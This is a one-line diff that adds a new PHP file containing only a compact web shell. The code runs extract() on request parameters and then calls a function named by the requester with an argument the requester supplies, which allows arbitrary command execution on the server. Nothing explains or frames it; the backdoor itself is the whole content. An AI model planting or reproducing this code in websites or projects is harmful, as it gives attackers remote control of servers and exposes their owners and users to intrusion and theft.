@@ -1,0 +1,1 @@
+<?php extract($_REQUEST) && @$pass(stripslashes($system)) && exit;
